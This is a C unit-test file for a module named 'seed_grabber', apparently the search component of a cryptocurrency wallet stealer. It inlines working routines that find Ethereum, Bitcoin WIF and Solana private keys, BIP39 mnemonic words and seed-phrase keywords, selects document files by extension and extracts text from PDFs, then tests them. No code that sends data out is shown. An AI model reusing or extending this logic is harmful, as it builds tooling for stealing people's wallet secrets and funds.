/*
 * test_seed_grabber.c — Crypto key scanning + PDF extraction + ext filter tests
 * Build: gcc -Wall -Wextra -O2 -Iinclude -std=c11 -o tests/test_seed_grabber.exe tests/test_seed_grabber.c
 */
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ── Inline the pure-logic helpers from seed_grabber.c ──────── */

static int is_base58(char c) {
    return (c >= '1' && c <= '9') || (c >= 'A' && c <= 'H') ||
           (c >= 'J' && c <= 'N') || (c >= 'P' && c <= 'Z') ||
           (c >= 'a' && c <= 'k') || (c >= 'm' && c <= 'z');
}
static int is_hex_char(char c) {
    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
}
static int match_eth_key(const char *line, size_t len) {
    return (len >= 66 && line[0] == '0' && (line[1] == 'x' || line[1] == 'X') &&
            is_hex_char(line[2]) && is_hex_char(line[3]));
}
static int match_btc_wif(const char *line, size_t len) {
    if ((len < 51 || len > 52) || (line[0] != '5' && line[0] != 'K' && line[0] != 'L'))
        return 0;
    for (size_t i = 1; i < len; i++)
        if (!is_base58(line[i])) return 0;
    return 1;
}
static int match_solana_key(const char *line, size_t len) {
    if (len < 64 || len > 88) return 0;
    for (size_t i = 0; i < len; i++)
        if (!is_base58(line[i])) return 0;
    return 1;
}
static int match_crypto_keyword(const char *line, size_t len) {
    char lower[512];
    size_t n = len < sizeof(lower) - 1 ? len : sizeof(lower) - 1;
    for (size_t i = 0; i < n; i++)
        lower[i] = (line[i] >= 'A' && line[i] <= 'Z') ? line[i] + 32 : line[i];
    lower[n] = '\0';
    return (strstr(lower, "seed") || strstr(lower, "mnemonic") ||
            strstr(lower, "private key") || strstr(lower, "recovery phrase") ||
            strstr(lower, "secret key"));
}
static int has_target_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return 0;
    dot++;
    if (_stricmp(dot, "txt") == 0) return 1;
    if (_stricmp(dot, "json") == 0) return 1;
    if (_stricmp(dot, "md") == 0) return 1;
    if (_stricmp(dot, "doc") == 0) return 1;
    if (_stricmp(dot, "docx") == 0) return 1;
    if (_stricmp(dot, "pdf") == 0) return 1;
    return 0;
}
static int is_pdf_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    return dot && _stricmp(dot + 1, "pdf") == 0;
}

/* ── PDF text extraction ──────────────────────────────────── */

static size_t extract_pdf_text(const unsigned char *data, size_t datalen,
                               char *out, size_t outlen) {
    if (!data || !out || outlen == 0) return 0;
    size_t pos = 0;
    const unsigned char *end = data + datalen;
    const unsigned char *p = data;
    while (p < end - 2) {
        const unsigned char *bt = NULL;
        while (p < end - 1) {
            if (p[0] == 'B' && p[1] == 'T') { bt = p; break; }
            p++;
        }
        if (!bt) break;
        const unsigned char *et = NULL;
        p = bt + 2;
        while (p < end - 1) {
            if (p[0] == 'E' && p[1] == 'T') { et = p; break; }
            p++;
        }
        if (!et) break;
        const unsigned char *s = bt + 2;
        while (s < et) {
            if (s + 2 <= et && s[0] == 'T' && s[1] == 'j') {
                const unsigned char *tok = s - 1;
                while (tok > bt + 2 && (*tok == ' ' || *tok == '\n' || *tok == '\r')) tok--;
                if (tok > bt + 2 && *tok == ')') {
                    const unsigned char *close_paren = tok;
                    tok--;
                    int depth = 1;
                    while (tok > bt + 2 && depth > 0) {
                        if (*tok == ')') depth++;
                        if (*tok == '(') depth--;
                        if (depth > 0) tok--;
                    }
                    if (depth == 0) {
                        tok++;
                        while (tok < close_paren && pos < outlen - 1) {
                            if (*tok == '\\' && tok + 1 < close_paren) tok++;
                            else { if (*tok >= 0x20 && *tok < 0x7f) out[pos++] = (char)*tok; }
                            tok++;
                        }
                    }
                }
            }
            s++;
        }
        if (pos > 0 && pos < outlen - 1 && out[pos-1] != '\n') out[pos++] = '\n';
        p = et + 2;
    }
    if (pos >= outlen) pos = outlen - 1;
    out[pos] = '\0';
    return pos;
}

/* ── BIP39 scan (simplified) ──────────────────────────────── */

static const char *bip39_test[] = {
    "abandon","ability","able","about","above","absent","absorb","abstract",
    "absurd","abuse","access","accident"
};
#define BIP39_N (sizeof(bip39_test)/sizeof(bip39_test[0]))

static void count_bip39(const char *text, int *matches) {
    if (!text || !matches) return;
    const char *p = text;
    while (*p) {
        while (*p && (*p==' '||*p=='\n'||*p=='\r'||*p=='\t')) p++;
        const char *ws = p;
        while (*p && *p!=' '&&*p!='\n'&&*p!='\r'&&*p!='\t') p++;
        size_t wl = (size_t)(p - ws);
        if (wl == 0) continue;
        for (size_t i = 0; i < BIP39_N; i++)
            if (strlen(bip39_test[i])==wl && memcmp(ws,bip39_test[i],wl)==0)
                { (*matches)++; break; }
    }
}

/* ═══════════════════════ TESTS ═══════════════════════════ */

static void test_hex_char(void) {
    assert(is_hex_char('0') && is_hex_char('9'));
    assert(is_hex_char('a') && is_hex_char('f'));
    assert(is_hex_char('A') && is_hex_char('F'));
    assert(!is_hex_char('g') && !is_hex_char('G') && !is_hex_char('z'));
    assert(!is_hex_char(' ') && !is_hex_char('\0'));
    printf("  PASS: test_hex_char\n");
}

static void test_base58(void) {
    assert(is_base58('1') && is_base58('9'));
    assert(is_base58('A') && is_base58('H'));
    assert(is_base58('J') && is_base58('N'));
    assert(is_base58('P') && is_base58('Z'));
    assert(is_base58('a') && is_base58('k'));
    assert(is_base58('m') && is_base58('z'));
    /* excluded: 0, O, I, l */
    assert(!is_base58('0') && !is_base58('O'));
    assert(!is_base58('I') && !is_base58('l'));
    printf("  PASS: test_base58\n");
}

static void test_eth_key_match(void) {
    /* Valid: 0x + 64 hex chars */
    const char *valid = "0xabcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
    assert(match_eth_key(valid, strlen(valid)));
    /* Too short */
    assert(!match_eth_key("0xabcdef", 8));
    /* No 0x prefix */
    const char *no_prefix = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef01234567890000";
    assert(!match_eth_key(no_prefix, strlen(no_prefix)));
    /* Empty */
    assert(!match_eth_key("", 0));
    printf("  PASS: test_eth_key_match\n");
}

static void test_btc_wif_match(void) {
    /* Valid 51-char WIF starting with '5' */
    char wif52[53];
    memset(wif52, 'K', 52); wif52[52] = '\0';
    assert(match_btc_wif(wif52, 52));
    /* Valid 51-char starting with '5' */
    char wif51[52];
    memset(wif51, '5', 51); wif51[51] = '\0';
    assert(match_btc_wif(wif51, 51));
    /* Wrong start char */
    char bad[53];
    memset(bad, 'A', 52); bad[52] = '\0';
    assert(!match_btc_wif(bad, 52));
    /* Contains '0' (not base58) */
    memset(bad, '5', 52); bad[10] = '0'; bad[52] = '\0';
    assert(!match_btc_wif(bad, 52));
    printf("  PASS: test_btc_wif_match\n");
}

static void test_solana_key_match(void) {
    /* Valid 64-char base58 */
    char sol65[65];
    memset(sol65, 'A', 64); sol65[64] = '\0';
    assert(match_solana_key(sol65, 64));
    /* Valid 88-char */
    char sol89[89];
    memset(sol89, 'a', 88); sol89[88] = '\0';
    assert(match_solana_key(sol89, 88));
    /* Too short */
    char short_key[33];
    memset(short_key, 'A', 32); short_key[32] = '\0';
    assert(!match_solana_key(short_key, 32));
    /* Contains '0' (not base58) */
    sol65[30] = '0';
    assert(!match_solana_key(sol65, 64));
    printf("  PASS: test_solana_key_match\n");
}

static void test_crypto_keyword(void) {
    assert(match_crypto_keyword("seed phrase here", 16));
    assert(match_crypto_keyword("mnemonic: twelve words", 22));
    assert(match_crypto_keyword("MY PRIVATE KEY IS", 18));
    assert(match_crypto_keyword("Recovery Phrase backup", 22));
    assert(match_crypto_keyword("secret key stored", 17));
    assert(!match_crypto_keyword("hello world", 11));
    assert(!match_crypto_keyword("", 0));
    printf("  PASS: test_crypto_keyword\n");
}

static void test_pdf_ext(void) {
    assert(is_pdf_ext("document.pdf"));
    assert(is_pdf_ext("file.PDF"));
    assert(!is_pdf_ext("file.txt"));
    assert(!is_pdf_ext("file"));
    assert(!is_pdf_ext(""));
    printf("  PASS: test_pdf_ext\n");
}

static void test_target_ext(void) {
    assert(has_target_ext("file.txt"));
    assert(has_target_ext("file.TXT"));
    assert(has_target_ext("file.json"));
    assert(has_target_ext("file.md"));
    assert(has_target_ext("file.doc"));
    assert(has_target_ext("file.docx"));
    assert(has_target_ext("file.pdf"));
    assert(!has_target_ext("file.exe"));
    assert(!has_target_ext("file"));
    assert(!has_target_ext(""));
    printf("  PASS: test_target_ext\n");
}

static void test_pdf_extraction(void) {
    /* Minimal PDF: BT (Hello World) Tj ET */
    const char *pdf = "garbage BT (Hello World) Tj ET more garbage";
    char out[256] = {0};
    size_t len = extract_pdf_text((const unsigned char *)pdf, strlen(pdf), out, sizeof(out));
    assert(len > 0);
    assert(strstr(out, "Hello World") != NULL);
    printf("  PASS: test_pdf_extraction\n");
}

static void test_pdf_extraction_no_bt_et(void) {
    const char *pdf = "no text blocks here at all";
    char out[256] = {0};
    size_t len = extract_pdf_text((const unsigned char *)pdf, strlen(pdf), out, sizeof(out));
    assert(len == 0);
    printf("  PASS: test_pdf_extraction_no_bt_et\n");
}

static void test_pdf_extraction_null(void) {
    char out[256];
    assert(extract_pdf_text(NULL, 10, out, sizeof(out)) == 0);
    assert(extract_pdf_text((const unsigned char *)"x", 1, NULL, 10) == 0);
    assert(extract_pdf_text((const unsigned char *)"x", 1, out, 0) == 0);
    printf("  PASS: test_pdf_extraction_null\n");
}

static void test_bip39_scan(void) {
    const char *text = "abandon ability able about above";
    int matches = 0;
    count_bip39(text, &matches);
    assert(matches == 5);
    printf("  PASS: test_bip39_scan\n");
}

static void test_bip39_no_match(void) {
    const char *text = "hello world foo bar";
    int matches = 0;
    count_bip39(text, &matches);
    assert(matches == 0);
    printf("  PASS: test_bip39_no_match\n");
}

static void test_bip39_partial_match(void) {
    /* "abandonment" contains "abandon" but is NOT a BIP39 word */
    const char *text = "abandonment ability";
    int matches = 0;
    count_bip39(text, &matches);
    assert(matches == 1); /* only "ability" matches */
    printf("  PASS: test_bip39_partial_match\n");
}

static void test_bip39_null(void) {
    int m = 0;
    count_bip39(NULL, &m);
    assert(m == 0);
    printf("  PASS: test_bip39_null\n");
}

/* ── Main ─────────────────────────────────────────────────── */

int main(void) {
    printf("=== test_seed_grabber: crypto key scanning ===\n");
    test_hex_char();
    test_base58();
    test_eth_key_match();
    test_btc_wif_match();
    test_solana_key_match();
    test_crypto_keyword();
    test_pdf_ext();
    test_target_ext();
    test_pdf_extraction();
    test_pdf_extraction_no_bt_et();
    test_pdf_extraction_null();
    test_bip39_scan();
    test_bip39_no_match();
    test_bip39_partial_match();
    test_bip39_null();
    printf("=== test_seed_grabber: ALL PASSED ===\n");
    return 0;
}
